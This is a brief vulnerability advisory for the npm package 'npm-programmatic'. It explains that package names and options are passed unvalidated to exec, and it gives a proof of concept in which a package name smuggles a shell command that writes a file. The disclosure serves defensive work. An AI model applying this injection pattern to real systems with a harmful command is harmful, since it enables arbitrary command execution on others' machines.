# Overview

`npm-programmatic` is a library that allows you to access npm commands programmatically from javascript, this package is vulnerable to Command Injection.

The packages and option properties are concatenated together without any validation and are used by the `exec` function directly.

# Proof of Concept

```
var root = require("npm-programmatic");
var attack_code = "& echo vulnerable > create.txt &";
root.install([attack_code], {"cwd": "./"});
```
